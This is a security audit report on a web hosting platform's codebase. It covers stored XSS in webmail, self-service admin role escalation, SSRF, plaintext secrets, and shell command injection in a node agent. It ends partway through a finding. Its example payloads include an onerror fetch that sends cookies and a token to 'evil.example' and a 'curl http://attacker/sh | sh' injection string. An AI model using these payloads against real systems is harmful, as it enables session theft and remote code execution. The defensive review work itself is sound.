# ShanuTechX Hosting Platform — Bug Report

## Coverage

**Every custom source file in this repository has now been read**, with the sole exception of the vendored third-party SDK packages listed below (unmodified copies of Supabase's own open-source libraries — not this project's code):

- `apps/api/src` — every file in `lib/`, `middleware/`, and `routes/` (all ~165 files).
- `services/` — every file in `node-agent/`, `discord-bot/`, `whatsapp-bot/`.
- `apps/dashboard` — every page in `app/` (84 files), every component in `components/` (57 files), and every file in `lib/`.
- `apps/web` — every page and component (72 files).
- `apps/mobile-admin` — every screen, lib file, and component (23 files).
- `packages/client`, `packages/deployments`, `packages/catalog`, `packages/db/scripts`.
- `firebase/database.rules.json` and the relevant parts of `infra/control-plane/docker-compose.yml` (cross-checked against the app's own assumptions about network placement and env var configuration).
- **Deliberately excluded:** `packages/postgrest-js`, `packages/realtime-js`, `packages/auth-js`, `packages/supabase-js`, `packages/storage-js`, `packages/functions-js`.

## Findings, roughly worst-first

---

## 🔴🔴🔴 Second-worst finding: the standalone Webmail inbox renders inbound email HTML with ZERO sanitization — trivial stored XSS from any email sender

**`apps/dashboard/app/webmail/page.tsx` (line 1065)**

```jsx
<div
  className="prose text-sm ..."
  dangerouslySetInnerHTML={{ __html: selectedMessage.htmlBody || selectedMessage.snippet }}
/>
```

This is the **standalone** Webmail product (`/webmail`, distinct from the newer `(protected)/email` page reviewed elsewhere in this report). It renders the raw HTML body of an inbound email directly into the page via `dangerouslySetInnerHTML` with **no sanitization whatsoever** — not even the imperfect hand-rolled `sanitizeHtml()` that the other webmail UI at least attempts (see that finding elsewhere in this report). There is no import of `sanitizeHtml`, DOMPurify, or any other cleaning function anywhere in this 1344-line file.

Anyone in the world can send an email containing `<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie+'&t='+localStorage.getItem('webmail_token'))">` (or a `<script>` tag, or any other payload) to a mailbox hosted on this platform. The moment the mailbox owner opens that message in this webmail view, the payload executes in their browser in the webmail page's own origin — with direct access to `localStorage` (where the webmail session JWT is stored, per `webmail_token`) and to anything else reachable from that origin. This is a complete, unauthenticated, zero-click-required (beyond opening the email, which is the entire point of an inbox) stored XSS vector, reachable by any external sender with no account on the platform at all.

Fix immediately: route `htmlBody`/`snippet` through the same sanitizer as the other webmail UI (and fix that sanitizer's own gaps too, per the other finding), before ever passing it to `dangerouslySetInnerHTML` — or better, use an iframe with a strict `sandbox` attribute and no scripting allowed to render untrusted email HTML, which is the standard safe pattern for webmail clients.

---

## 🔴🔴🔴 THE most severe finding: a literal "become Admin" dropdown, live in the sidebar for every user

**`apps/dashboard/components/Sidebar.tsx` (~line 456) + `apps/api/src/routes/me.ts` (`PATCH /api/me/role`)**

Every logged-in user whose role isn't already `dev` sees a `<select>` dropdown right next to their own name/avatar in the main sidebar:
```jsx
<select value={apiUser.role} onChange={async (e) => { await switchRole(e.target.value); }}>
  <option value="admin">Admin Account</option>
  <option value="support">Support Account</option>
  <option value="customer">Customer Account</option>
</select>
```
Selecting an option calls `switchRole()` → `PATCH /api/me/role` (`apps/api/src/routes/me.ts:75`). The backend handler for that endpoint is:
```js
meRouter.patch('/me/role', requireAuth, async (req, res) => {
  const parsed = updateRoleSchema.safeParse(req.body);   // just checks it's one of the 4 enum strings
  if (req.user!.role === 'dev' && parsed.data.role !== 'dev') {
    return res.status(403).json({ error: 'Developer accounts cannot be demoted.' });
  }
  const updatedUser = await prisma.user.update({ where: { id: req.user!.id }, data: { role: parsed.data.role }, ... });
  ...
});
```
The **only** restriction is "a `dev` account can't demote itself." There is no check anywhere that the caller is already staff before letting them move *up* to `admin`. **Any brand-new customer signup can open the sidebar dropdown, pick "Admin Account," and their own account is immediately, permanently updated to `role: 'admin'` in the database** — full access to every admin surface this report has covered: the payment review queue, all customers' data and tickets, VPS/node infrastructure, the secrets vault endpoints, managed databases, everything gated by `requireAdmin`/`requireAdminOrDev` throughout this codebase. No email tricks, no timing games, no chained exploits — just one dropdown selection. This completely dwarfs every other finding in this report, including the email-substring auto-promotion bug below (which at least requires picking a specific email address); this requires nothing but having an account at all.

This is almost certainly a developer/QA convenience (quickly previewing the dashboard UI as different roles) that was never gated to internal/dev users and shipped live. Fix immediately: remove the dropdown for anyone who isn't already an internal/dev account (or remove it from production builds entirely), and add a server-side check to `PATCH /api/me/role` that only allows this self-service switch for accounts already flagged as staff/dev, never a plain `customer` moving to `admin`/`support`/`dev`.

---
## `apps/api/src/lib/failoverEngine.ts`

- **Hardcoded fallback DB password on failover** (line ~186): when migrating a managed database whose `credentialRef` is missing or fails to decrypt, the code silently uses the literal password `'db_password_default'` to provision the *new* database container:
  ```js
  let password = 'db_password_default';
  if (db.credentialRef) { try { password = decryptSecret(...); } catch { /* fallback default */ } }
  ```
  Two problems: (1) it's a guessable, hardcoded credential used in production; (2) the DB's `credentialRef` in the DB row is never updated to reflect this new password, so any app/user relying on the original stored credential silently breaks after failover, and nothing surfaces this to an operator. Should generate a strong random password, re-encrypt it, persist the new `credentialRef`, and alert loudly instead of failing silently to a fixed string.
- **Audit log misattribution** (line ~280): automatic/system-triggered failover is logged with `adminId: adminUser.id` where `adminUser` is just "the first admin or dev found in the table" — an arbitrary human gets blamed/credited for a system action they didn't take. Should use a dedicated system actor id or null with `actorRole: 'system'` alone (the field already exists but `adminId` shouldn't point at a real, unrelated human).

## `apps/api/src/lib/abuseDetector.ts`

- **`banUserAndTeardownResources` throws on every automated (non-admin-triggered) ban** (line ~87): `AuditLog.adminId` is a **required foreign key to `User.id`** (see `packages/db/prisma/schema.prisma` model `AuditLog`). When the abuse detector bans a user automatically (no human `actorId`), the code writes:
  ```js
  adminId: actorId || 'SYSTEM_ABUSE_DETECTOR',
  ```
  `'SYSTEM_ABUSE_DETECTOR'` is not a real user id, so `prisma.auditLog.create(...)` violates the FK constraint and throws. The function's own `try { ... } catch (err) { logger.error(...); throw err; }` re-throws it.
  - Callers `apps/api/src/routes/catalog.ts:562` and `apps/api/src/routes/deployments.ts:94` `await` this call with **no try/catch**, directly before `return res.status(403).json({...})`. So on every automated abuse-triggered ban, the intended 403 "account suspended" response never gets sent — the request instead crashes with an unhandled 500, even though the ban, API-key revocation, and deployment teardown all already completed successfully beforehand.
  - No audit log entry ends up existing for the automated ban at all, defeating the stated purpose of "BUG-12 FIX: use SYSTEM_ABUSE_DETECTOR when automated" (the comment claims this was already fixed, but the fix doesn't satisfy the DB constraint).
  - Fix: either add a real system/service user row to seed data and reference its id, or make `adminId` nullable for system actions (there's already an `actorRole` column intended for exactly this — `'system'` — that isn't used here).

## `apps/api/src/lib/sshTerminalGateway.ts`

- **Weaker, inconsistent ownership check duplicated instead of reused** (line ~207): `canAccessResource` is imported but never called; the file re-implements a narrower check: `if (user.role === 'customer' && provision.userId !== user.id) return fail(...)`. This silently allows through any role that isn't `'customer'` (e.g. `'support'`) without verifying assignment/ownership, unlike the shared `canAccessResource` helper which correctly denies unrelated `support` users. **Currently not exploitable in practice** because the only way to reach this code is via a ticket minted in `routes/vps.ts` (`POST /vps-provisions/:id/ssh-ticket`), which does correctly call `canAccessResource` before issuing the ticket — so today's request flow is safe. But this is fragile: any future ticket-issuing call site that forgets that check (or a ticket-replay bug) would grant a `support` user or similar an SSH terminal into any customer's VPS with no ownership check at all. Should call the shared `canAccessResource`/`verifyResourceOwnershipAsync` here too instead of relying entirely on the caller.

## `apps/api/src/lib/uploads.ts` (payment-proof upload)

- **File-type validation trusts only the client-supplied MIME type; extension comes straight from the client-supplied filename** (lines 22-36): `fileFilter` checks `file.mimetype`, which is just the `Content-Type` header the uploader's browser/HTTP client puts on that multipart part — trivially spoofable, no magic-byte/content sniffing. The stored filename's extension is `path.extname(file.originalname)` with **no extension allow-list**, so a client can send `Content-Type: image/jpeg` (passes the filter) with `originalname: "shell.php"` (or `.html`, `.svg`, etc.) and the server will happily write that file to disk as `payments/<orderId>/<timestamp>.php` regardless of what the actual bytes are. If the uploads directory (`UPLOADS_DIR`, e.g. `/var/lib/shanutechx/uploads`) is ever served statically by a web server, or the extension is later trusted anywhere (e.g. `.html`/`.svg` opened inline), this is a stored-content/RCE-adjacent risk. Should validate real content type (e.g. `file-type` sniffing from the buffer/magic bytes) and force the extension from an allow-list derived from the *validated* type, ignoring the client-supplied extension entirely.

## `apps/api/src/lib/subdomain.ts` / `apps/api/src/lib/deployPipeline.ts`

- **Requested custom subdomain silently discarded on conflict, no error surfaced** (`subdomain.ts` lines 80-89, called from `deployPipeline.ts:95`): `generateSubdomain(preferredName, userRequestedSubdomain)` only honors the user's requested subdomain `if (check.valid && check.formatted)`; if it's invalid (reserved word, already taken by another deployment, etc.) it silently falls through to generating an unrelated random one — with no return value or thrown error indicating this happened. `routes/deployments.ts`'s create-deployment handler only regex-validates the *format* of `customSubdomain` via zod (`.regex(...)`) and never calls `validateCustomSubdomain` (which checks the reserved list and DB uniqueness) before calling `deployService`. Net effect: a customer requests `myapp.example.com`, it happens to be reserved/taken, and their deployment goes live at a completely different, randomly generated subdomain (e.g. `app-x7k2p9.example.com`) with zero indication in the API response that their chosen name wasn't used. Fix: call `validateCustomSubdomain` before deployment creation and return a 400 with the specific reason if it fails, rather than silently substituting a random name deep in `generateSubdomain`.

## `apps/api/src/lib/backup.ts` — `restoreBackup()` is broken (double-consumes the S3 stream)

Lines 140-188: the code first fully drains the S3 object body to get a byte array:
```js
const byteArray = await response.Body?.transformToByteArray();
if (!byteArray) { throw new Error('Failed to retrieve backup archive'); }
```
...then **never uses `byteArray` again**. Instead it goes on to pipe `response.Body` a second time into `gunzip.stdin`:
```js
if (response.Body && 'pipe' in response.Body) {
  (response.Body as any).pipe(gunzip.stdin);
} else if (response.Body) {
  const reader = (response.Body as any).getReader();
  ...
}
```
`response.Body` in the AWS SDK v3 is a single-use stream — once `.transformToByteArray()` has consumed it, it's exhausted/locked. The second read (`.pipe()` or `.getReader()`) will either throw (stream already consumed / reader lock error) or yield zero bytes, meaning **every restore attempt will fail or silently pipe an empty archive into `psql`**, restoring nothing. This looks like a merge artifact — two different implementation approaches (buffer-then-write vs. stream-through) got left in the same function. Fix: pick one — either write the already-fetched `byteArray` directly to `gunzip.stdin` (`gunzip.stdin.end(Buffer.from(byteArray))`) and delete the second `response.Body` consumption, or drop the `transformToByteArray()` call entirely and only stream `response.Body` once.

## `apps/api/src/lib/webhooks.ts` / `apps/api/src/routes/webhooks.ts` — SSRF via customer-configured webhook URL

`routes/webhooks.ts` validates the customer-supplied webhook URL with only `url: z.string().url()` — any syntactically valid URL is accepted, with no scheme restriction (http vs https), no private/internal IP blocking, and no DNS-rebinding protection. `fireWebhook()` (`lib/webhooks.ts:149`) then does a server-side `fetch(webhook.url, ...)` whenever a deployment/payment/ticket event fires for that customer — an event the customer themselves can usually trigger (e.g. deploying/redeploying their own app changes its status).

This is a classic SSRF: a customer can register a webhook URL pointing at:
- Internal-only infra explicitly documented elsewhere as "never exposed publicly" (e.g. `env.traefikApiUrl` = `http://traefik:8080`, reachable from the API server's own network),
- Cloud metadata endpoints (`http://169.254.169.254/...`) if hosted on AWS/GCP/etc.,
- Other internal services/ports on the API server's private network (`localhost`, `10.x`, `172.16-31.x`, `192.168.x`),

...and get the API server to make authenticated-by-network-position requests there, with the response behavior (status code/timing) observable indirectly via the `WebhookDelivery` record's `statusCode`/`errorMessage`, giving a blind-SSRF oracle for internal network reconnaissance.

Fix: resolve and validate the webhook host at both creation time and dispatch time — reject private/loopback/link-local IP ranges (including after DNS resolution, to prevent rebinding), require `https://`, and consider a fixed allow-list or an egress proxy that only permits public destinations.

## `apps/api/src/lib/nodeAgentClient.ts` — cluster secret and all agent traffic sent over plaintext HTTP to public node IPs

`agentUrl()` (line ~8) builds `http://${node.ip}:${env.nodeAgentPort}${path}` — **plain HTTP, not HTTPS** — and `node.ip` is the node's *public* IP address (it's populated from `curl -s https://api.ipify.org` during provisioning in `routes/nodes.ts`). Every call to the node agent (`callNodeAgent`, `buildAndRun`, database/LiveKit provisioning, stop/start, etc.) sends the master `x-agent-secret` (`env.nodeAgentSecret` — the same cluster-wide secret used to authorize provisioning brand-new nodes) in a cleartext header, over the public internet, along with request bodies that can include decrypted environment variables, database passwords, and LiveKit API secrets (see `failoverEngine.ts`, `orderFulfillment.ts`).

Anyone positioned on the network path between the API server and a node (an intermediate ISP/hosting-provider network, a compromised router, etc.) can passively capture the cluster secret and any in-flight credentials. Since the same secret is accepted by *every* node's agent (per `services/node-agent/src/index.js`), capturing it once from traffic to any single node compromises the whole fleet. This directly undermines the "shared secret as a second layer of defense" model described in the node-agent's own comments, since the "first layer" (private network) isn't actually in place — the traffic is going over the public internet by construction (`node.ip` is public). Fix: use HTTPS/TLS for all node-agent calls (e.g. via a self-signed cert pinned by the API server, or a WireGuard/private overlay network as the comments elsewhere suggest was the intended design), never plain HTTP with a long-lived shared secret over the public internet.

## `apps/api/src/lib/currency.ts` — "admin-updatable" FX rate doesn't actually exist

The file's own doc comment says the USD→LKR rate is "stored (admin-updatable)" and the hardcoded `DEFAULT_USD_TO_LKR_RATE = 300` is "a starting point, not a live rate." In reality, **every caller** (`routes/billing.ts:87`, `routes/orders.ts:53,57`) calls `convertToLkr(amount, currency)` with no third argument, so they all silently use the hardcoded compile-time constant. There is no settings table, admin endpoint, or any other reference to a configurable FX rate anywhere in the codebase (`grep` for `usdToLkr|exchangeRate|fxRate` across `apps/api`, `apps/dashboard`, and the Prisma schema turns up nothing else). This means the "admin-updatable" feature described in the comments was never actually built — the real exchange rate can only be changed by editing this constant and redeploying, and every USD order is billed/verified against a fixed 1 USD = 300 LKR rate indefinitely, regardless of real-world FX movement. This directly affects revenue (over/under-charging) and payment verification (`paymentMatcher.ts` compares proofs against `totalLkr`, which is derived from this same stale rate).

## `apps/api/src/index.ts` / `apps/api/src/middleware/rateLimit.ts` — per-IP rate limiting and CSRF logging are broken behind the documented reverse proxy

The production deployment (`infra/control-plane/docker-compose.yml`) puts the `api` service behind **Traefik**, terminating TLS and proxying `api.${ROOT_DOMAIN}` → the API container (see the `traefik.http.routers.api.*` labels). However, `apps/api/src/index.ts` never calls `app.set('trust proxy', ...)`, and nothing in the app manually reads `X-Forwarded-For` to determine the real client IP (the only place that even mentions the header is `csrfProtection.ts`'s log statement, which just uses `req.ip` directly).

With Express's default `trust proxy = false`, `req.ip` resolves to the **immediate TCP peer** — i.e. Traefik's own container IP — for every single request in production, not the real client's IP. Consequences:
- `globalLimiter`, `authRateLimiter` (login/signup brute-force protection), `paymentUploadLimiter`, and `smsWebhookLimiter` (all in `middleware/rateLimit.ts`, keyed by `req.ip` via `express-rate-limit`'s default) all bucket **every client on the planet into the same key** (Traefik's address). In practice this means: (a) the 15-attempts-per-15-minutes login limiter isn't per-attacker at all — it's a shared global budget that any user's failed logins eat into, so a small brute-force burst from one IP can lock out login for *every* legitimate user simultaneously; (b) conversely, a distributed attacker (many real source IPs) trivially shares one budget with everyone else and isn't slowed down any more than one attacker would be.
- The `validate: { trustProxy: false }` option passed to `express-rate-limit` only silences that library's own configuration-mismatch warning — it does **not** fix the underlying issue; the real fix is enabling `app.set('trust proxy', 1)` (or the correct hop count) in `index.ts` so `req.ip` reflects `X-Forwarded-For` from the trusted Traefik hop.
- Security-relevant logging (`csrfProtection.ts`'s blocked-origin warning) records the proxy's IP instead of the actual client, making IP-based abuse investigation useless.

## `apps/api/src/routes/metrics.ts` — `/metrics` is publicly reachable, not "internal only" as assumed

The code comment claims `/metrics` has "no auth middleware, matching every real-world Prometheus target; safety comes from network placement (internal Docker network only)." But the documented production Traefik config (`infra/control-plane/docker-compose.yml`) routes the API with `traefik.http.routers.api.rule=Host(api.${ROOT_DOMAIN})` — a **Host-only rule with no `PathPrefix` restriction** — so Traefik forwards every path, including `/metrics`, from the public internet straight to the API container. In this actual deployment, `GET https://api.<rootdomain>/metrics` is reachable by anyone, unauthenticated, exposing Prometheus metrics including business gauges (`activeDeploymentsGauge`, `pendingPaymentsGauge`, `openTicketsGauge` in `lib/metrics.ts`) plus default Node.js process metrics (memory, event-loop lag, GC stats) that aid reconnaissance. Fix: either add a Traefik middleware restricting `/metrics` to the internal network/a specific source IP allowlist, or require the same kind of shared-secret/basic-auth check other internal endpoints use.

## `apps/api/src/routes/secrets.ts` — "add/update one secret" leaks every secret in the project, decrypted

The file explicitly documents "BUG-04 FIX" in two places: the list endpoint (`GET /secrets/projects/:id`) and the bulk-import endpoint both intentionally return `secrets.map(safeListItem)` — metadata only, no decrypted values — specifically so that a dedicated per-key `/reveal` endpoint (with its own audit-logged access) is the only way to see a secret's plaintext.

But endpoint **4, "Add or Update Single Secret"** (`POST /secrets/projects/:id/secrets`, line ~146) does the opposite:
```js
const secrets = await prisma.secretItem.findMany({ where: { projectId: id } });
res.json({
  project: { ..., secrets: secrets.map(decryptItem) }  // <-- decrypts EVERY secret in the project
});
```
So updating (or creating) a single secret returns the **entire project's secret list, fully decrypted**, in the HTTP response — every other secret in that project gets exposed in plaintext to anyone with permission to add/edit just one key. This completely undoes the segregation the "BUG-04 FIX" was meant to establish (client-side code, browser devtools network tab, any request logging/proxy, or a compromised frontend dependency now sees all secrets on every single-secret write, not just the one being written). It's also inconsistent with the bulk-import endpoint two functions later, which correctly uses `safeListItem` for the same kind of response. Fix: change line ~166 to `secrets.map(safeListItem)`, matching every other list-returning endpoint in this file, and return only the newly written secret's own value (if the caller needs to confirm what was saved) via `decryptItem(newOrUpdatedSecret)` alone.

## 🔴 `apps/api/src/routes/gitConnect.ts` — the entire GitHub OAuth callback route is dead code (unterminated comment swallows it)

Lines 71-118. The JSDoc comment meant to document the GitHub App installation callback opens with `/**` on line 71 but is **never closed** with `*/` before the actual route registration:
```ts
/**
 * GitHub App installation callback. GitHub redirects here after the user
 * finishes the "Install App" flow.
gitConnectRouter.get('/git/github/callback', async (req, res: Response) => {
  ...
  ... (full ~40-line handler body) ...
  ...
});

/**
 * GitLab OAuth callback. GitLab redirects here with `code` + our signed
 * `state` after the user authorizes the application.
 */                                          // <-- this closes the ORIGINAL, still-open comment from line 71
gitConnectRouter.get('/git/gitlab/callback', async (req, res: Response) => {
```
Because block comments don't nest, the comment opened at line 71 stays open straight through the entire GitHub callback handler and only actually terminates at the `*/` on line 118 — which was intended to close the *GitLab* callback's docblock. I verified this by mechanically stripping all `/* ... */` blocks from the file: `gitConnectRouter.get('/git/github/callback', ...)` disappears entirely, while the GitLab route survives.

**Effect: the `GET /api/git/github/callback` route is never registered.** After a user installs the GitHub App and GitHub redirects them back to `.../api/git/github/callback?installation_id=...&state=...`, the request 404s — the installation is never linked to the user's account (`prisma.gitHubInstallation.upsert(...)` never runs), and the user is stuck on GitHub's redirect with no confirmation and no working GitHub integration. Given the file's own doc comment says GitHub is the *primary*, PAT-free way to connect a repo, this likely breaks GitHub-based deployments entirely for every user, while GitLab (whose comment block happens to be correctly formed) works fine. Fix: add the missing `*/` after "finishes the 'Install App' flow." (before line 74).

## 🔴 `apps/api/src/routes/managedDatabases.ts` — "Manage Database Users" feature never touches the real database

The `POST /managed-databases/:id/users`, `PATCH /managed-databases/:id/users/:username`, and `DELETE /managed-databases/:id/users/:username` endpoints (lines 360-418, 424-465) only write to the platform's own Prisma metadata table (`prisma.managedDatabaseUser.create/update/deleteMany`). None of them import or call `nodeAgentClient` (or anything else that would reach the actual database container) — contrast with `action`/`delete`/`migrate`/`scale` a bit further down in the same file, which correctly call `containerAction`/`migrateDatabaseContainer`/`scaleDatabaseContainer` on the real node.

Concretely: a customer calls "Create DB user," the API generates a random password, encrypts and stores it, and returns `{ user: { username, password, ... } }` looking exactly like success — but no `CREATE USER ... WITH PASSWORD ...` (or MySQL/Mongo/Redis equivalent) is ever executed against the real running database engine. The user simply doesn't exist there. Any attempt to actually connect an application using these "created" credentials will fail authentication. Same for role/password updates (`PATCH`) and deletion (`DELETE`) — they update/remove bookkeeping rows only, while the real database user (if it happens to exist from some earlier manual step) is left completely untouched. This makes the entire per-database user-management feature non-functional beyond its own admin UI.

## `apps/api/src/routes/managedDatabases.ts` — `scale` endpoint silently drops `storageLimitGb`, and never persists the new `cpuLimit`/`memoryLimitMb`

`POST /managed-databases/:id/scale` (line 588) accepts and validates `cpuLimit`, `memoryLimitMb`, `storageLimitGb`, and `maxConnections`. Only `cpuLimit`/`memoryLimitMb` are actually sent to the real container via `scaleDatabaseContainer(...)` — `storageLimitGb` is never passed to the container call and never written anywhere, so a customer requesting more storage gets a 200 "scaled successfully" response while literally nothing happens. Separately, the Prisma `update` call afterward only persists `maxConnections` and `dbVersion`:
```js
data: {
  ...(parsed.data.maxConnections ? { maxConnections: parsed.data.maxConnections } : {}),
  ...(parsed.data.dbVersion ? { dbVersion: parsed.data.dbVersion } : {}),
},
```
`cpuLimit` and `memoryLimitMb` *are* applied to the real container but are never saved back to the `ManagedDatabase` row, so the platform's own records (and any UI reading them) will show stale CPU/RAM values forever after a scale-up, even though the container itself changed.

## `apps/api/src/routes/catalog.ts` — `POST /catalog/deploy` lets a customer set an arbitrary, unvalidated `subdomain` (reserved-word & uniqueness checks bypassed)

`deploySchema` only requires `projectName: z.string().min(1).optional()` — no format regex, no reserved-word check, no uniqueness check. That raw value flows straight into `composeName` (line 593) and then directly into `Deployment.subdomain` (line 634) with **no call to `validateCustomSubdomain`/`generateSubdomain`** (the functions the rest of the platform uses precisely to block reserved names like `www`/`api`/`admin` and to guarantee uniqueness — see the `subdomain.ts` finding above). Concretely, any authenticated customer can `POST /api/catalog/deploy` with `projectName: "www"` (or `api`, `admin`, or any other deployment's exact existing subdomain) and get a `Deployment` row with that literal `subdomain`, with no collision check against existing deployments.

Separately, note the node-agent (`services/node-agent/src/index.js:958`) *does* sanitize `projectName` before using it as the actual Docker Compose project name (`.replace(/[^a-z0-9-]/gi, '-')`), so this isn't a shell-injection vector — but it means the platform's own `Deployment.subdomain` DB value (raw, customer-supplied) can end up **different from** the sanitized name the container is actually registered under on the node, which is its own source of routing bugs on top of the reserved-word/collision issue. Fix: route `projectName` through the same `validateCustomSubdomain`/reserved-list/uniqueness logic used everywhere else before it's ever persisted as `subdomain`.

## `apps/api/src/routes/webmailAuth.ts` — two issues

1. **Master secrets-vault encryption key reused as JWT signing secret** (lines 68, 142, 191): webmail session tokens are signed and verified with `env.secretsEncryptionKey` — the exact same key `lib/secretsVault.ts` uses for AES-256-GCM encryption of every stored secret platform-wide (VPS root passwords, managed-database passwords, deployment env vars, git tokens, etc., per `lib/secretsVault.ts`, `routes/secrets.ts`, `routes/managedDatabases.ts`). Using one key for two unrelated cryptographic purposes (symmetric encryption-at-rest vs. HMAC token signing) is a key-hygiene violation: any weakness or leak on the JWT side (a `jsonwebtoken` CVE, a verbose error/log that echoes back key material, a brute-force/side-channel opportunity from the high volume of webmail logins) directly threatens the master vault key protecting *everything else* in the platform, not just webmail sessions. These should be two independently-generated secrets.
2. **Non-constant-time password comparison** (line 60): `if (storedPass !== password)` uses JavaScript's native `!==`, which short-circuits on the first differing byte — a timing side channel (unlike the rest of the codebase, which correctly uses `crypto.timingSafeEqual` for secret comparisons elsewhere, e.g. `gateAuth.ts`, `internalBot.ts`). Should decrypt and compare with `crypto.timingSafeEqual` on fixed-length buffers.
3. Minor: `jwt.verify(token, env.secretsEncryptionKey)` (lines 142, 191) doesn't pass an `algorithms: ['HS256']` restriction, unlike `lib/projectAuthService.ts`'s `verifyProjectAuthToken`, which correctly does. Not currently exploitable (no asymmetric keys are in play for this token type to enable classic alg-confusion), but it's an inconsistency with the rest of the codebase's own established best practice and should be tightened for defense-in-depth.

## `apps/dashboard/lib/sanitize.ts` — hand-rolled email-HTML sanitizer has gaps (used to render attacker-controlled inbound email content)

`WebmailMessageViewer.tsx`/`WebmailThreadViewer.tsx` render every inbound email's HTML body via `dangerouslySetInnerHTML={{ __html: sanitizeHtml(message.htmlBody) }}` — i.e. arbitrary, attacker-controlled content (anyone who emails the mailbox) goes through this custom sanitizer and straight into the DOM. Using a hand-rolled sanitizer instead of an audited library (DOMPurify, sanitize-html) for this specific threat model (arbitrary third-party-supplied HTML rendered to a logged-in user) is risky by itself, and this implementation has two concrete gaps:
1. **No `rel="noopener noreferrer"` enforcement on links.** The sanitizer never touches `target`/`rel` attributes. An email containing `<a href="https://attacker.example" target="_blank">Click here</a>` will render as-is; when the recipient clicks it, the attacker's page gets a live `window.opener` handle back to the still-open webmail tab and can do `window.opener.location = 'https://attacker.example/fake-login'` — classic reverse-tabnabbing, letting a received email silently redirect the victim's own dashboard tab to a phishing page after they click any link in it.
2. **URL-scheme filtering is a denylist, not an allowlist**: only `javascript:`, `vbscript:`, `data:text/html`, and `data:text/javascript` are explicitly blocked on `href`/`src`/`action`/`data`/`xlink:href`. Any other scheme not on that list (e.g. `data:image/svg+xml` — which can carry an embedded `<script>` and executes it if top-level-navigated to in some browser/version combinations, or any future/nonstandard scheme) passes through untouched. A safer, standard pattern is allowlisting `http:`/`https:`/`mailto:`/relative URLs and rejecting everything else, rather than trying to enumerate every dangerous scheme.

Fix: switch to DOMPurify (or similar) with a strict, explicit tag/attribute allowlist, and explicitly force `rel="noopener noreferrer"` (and ideally strip `target="_blank"` or route external links through a warning interstitial) on every anchor.

## 🔴 `services/discord-bot/src/slashCommands.js` — `/review-payment` fails OPEN if staff allowlist isn't configured

`isStaffAuthorized()` (line 57-68) ends with:
```js
return ALLOWED_DISCORD_USERS.length === 0 && ALLOWED_DISCORD_ROLES.length === 0;
```
If the operator hasn't set `ALLOWED_DISCORD_ROLES`/`ALLOWED_DISCORD_USERS` env vars (e.g. left blank at initial setup, or on any Discord server not yet configured with an explicit staff role), this function returns `true` for **every single member of the Discord server**, not just staff. Combined with `/review-payment` (line 131), any random Discord member could then approve or decline a customer's payment via the slash command — real, revenue-affecting state changes (`newOrderStatus = 'paid'`, `fulfillOrder(order.id)`, provisioning the ordered service for free) — with zero real authorization.

This matters because the backend endpoint it calls, `POST /api/internal/review-payment` (`apps/api/src/routes/internalBot.ts:152`), performs **no independent staff-identity check of its own** — it trusts the shared `x-internal-secret` header entirely and assumes the bot already verified the caller is staff. So the *only* gate against arbitrary Discord users approving payments is this one fail-open boolean. Fix: default to fail-closed — `isStaffAuthorized` should return `false` (deny) when no allowlist is configured, not `true`, and ideally the API endpoint should require an explicit reviewer role/allowlist check server-side too, not rely entirely on the calling bot's own logic.

## `apps/api/src/routes/internalBot.ts` — customer lookup by "last 9 digits" phone suffix can cross-match different customers

`GET /internal/customer-summary` (used by both the WhatsApp `!deployments`/`!tickets` commands and Discord) resolves the requesting phone number to a user with:
```js
const last9 = phone.slice(-9);
const user = await prisma.user.findFirst({
  where: { OR: [ { phoneNumber: phone }, { phoneNumber: `+${phone}` }, { phoneNumber: { endsWith: last9 } } ] },
});
```
The `endsWith: last9` fallback is meant to handle country-code formatting mismatches, but it means any two customers whose stored phone numbers happen to share the same last 9 digits (plausible with malformed/partial numbers, or genuinely different international numbers) will resolve to whichever one `findFirst` happens to return first — leaking one customer's deployment list and support-ticket subjects/status to a different customer texting from a similar-looking number. Since the WhatsApp Business API normally delivers a fully-normalized E.164 sender number, the safer fix is to drop the fuzzy suffix fallback (or only fall back to it when it uniquely identifies exactly one user, returning "no match" on any ambiguity instead of picking one arbitrarily).

## 🔴 `services/node-agent/src/nodeEngine.js` — OS command injection via `projectName` in `deployDockerCompose`

`deployDockerCompose()` (line ~465) builds a shell command by directly interpolating the caller-supplied `projectName` into a template-literal string executed via `exec` (not `execFile`):
```js
const { stdout, stderr } = await execAsync(`docker compose -f "${composePath}" -p "${projectName}" up -d`);
```
Unlike the sibling endpoint `/agent/compose/up` in `index.js` (which sanitizes `projectName` with `.replace(/[^a-z0-9-]/gi, '-')` before use), the route that reaches this function — `POST /agent/engine/docker/compose` (`index.js:739`) — passes `projectName` through **completely unsanitized**. A `projectName` like `x" && curl http://attacker/sh | sh #` breaks out of the double-quoted argument and injects arbitrary shell commands, executed with whatever privileges the node-agent process runs as (the file's own module doc-comment claims "All commands are executed strictly via child_process.execFile/spawn with argument arrays" and "User inputs are sanitized using strict regex whitelists" — this function violates both claims).

This is reachable end-to-end via `POST /api/nodes/:nodeId/engine/docker/compose` (`apps/api/src/routes/nodeEngine.ts:458`, wired into the dashboard at `apps/dashboard/lib/api.ts:1271`). Exploitability depends on who can reach a given node's agent:
- For the platform's own shared **cluster compute nodes** (the servers hosting *other* customers' apps), `resolveNodeAccess` restricts this to `admin`/`dev` role accounts only — but combined with **finding #1** (any email containing "dev"/"admin" self-promotes to that role) and **finding #5** (the node-agent shared secret travels in plaintext over the public internet), this chains into full root RCE on shared multi-tenant infrastructure reachable by a self-promoted account or anyone who intercepts the cluster secret.
- For a **customer's own leased VPS**, the customer can reach this against their own machine — lower severity since they already have root/SSH access to that box via other legitimate features, but it's still a real command-injection bug that should be fixed at the source regardless of who's allowed to reach it.

Fix: make `deployDockerCompose` use `execFile('docker', ['compose', '-f', composePath, '-p', projectName, 'up', '-d'])` with an argument array (like `/agent/compose/up` already correctly does), or at minimum apply the same `[^a-z0-9-]` sanitization before interpolating into the shell string.

## `apps/dashboard/components/RequireStaffOnly.tsx` / `apps/api/src/routes/tickets.ts` — "dev excluded from support" policy is never actually implemented

`RequireStaffOnly.tsx`'s own doc comment states the intended policy explicitly: *"Gates support-facing sections (tickets, live chat) to admin OR support. Explicitly excludes dev — dev passes the outer /admin/* layout gate ... but that doesn't mean dev should see customer support conversations, which are a different kind of access entirely."* But the actual guard condition is:
```js
const allowed = apiUser?.role === 'admin' || apiUser?.role === 'dev' || apiUser?.role === 'support';
```
